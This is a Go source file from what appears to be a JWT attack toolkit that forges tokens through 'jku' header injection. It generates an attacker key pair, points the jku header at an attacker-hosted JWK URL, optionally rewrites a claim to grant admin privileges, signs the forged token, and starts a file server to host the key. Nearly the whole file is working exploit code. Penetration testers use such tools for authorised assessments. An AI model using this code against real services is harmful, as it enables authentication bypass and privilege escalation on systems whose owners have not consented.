package attacks

import (
	"JWTechniques/ctrl"
	"fmt"
	"net/http"
	"strconv"

	"github.com/golang-jwt/jwt/v5"
)

func launchServer(port int) {
	fmt.Printf("The server is being launched on port %d\n", port)

	//Serve files from the "./files" directory
	fs := http.FileServer(http.Dir(ctrl.Directory))
	http.Handle("/", fs)

	http.ListenAndServe(":"+strconv.Itoa(port), nil)
}

func generateJkuToken(token *jwt.Token, userHeader string, userValue string, url string) (string, error) {

	tokenCpy := ctrl.CloneToken(token)

	//Generate the private key and public key (if needed)
	jwtKey, pathToFile, err := ctrl.GenerateJWK(tokenCpy.Header["alg"].(string))
	if err != nil {
		return "", err
	}

	//Change the value of the "JKU" header to set the path to our file containing our private key
	newToken, err := ctrl.ChangeValue(tokenCpy, "jku", url+pathToFile, true)
	if err != nil {
		return "", err
	}

	//Change the value of the header to create the admin privs token
	if userHeader != "" {
		newToken, err = ctrl.ChangeValue(newToken, userHeader, userValue, false)
		if err != nil {
			return "", err
		}
	}

	//Sign the token with our private key
	newJWT, err := newToken.SignedString(jwtKey)
	if err != nil {
		return "", err
	}

	return newJWT, nil
}

func ExploitJKU(token *jwt.Token, userHeader, userValue, url string, server bool) (string, error) {

	newJWT, err := generateJkuToken(token, userHeader, userValue, url)
	if err != nil {
		return "", err
	}

	fmt.Printf("JKU header injection  : %s\n\n", newJWT)

	if server {
		launchServer(12345)
	}

	return newJWT, nil

}
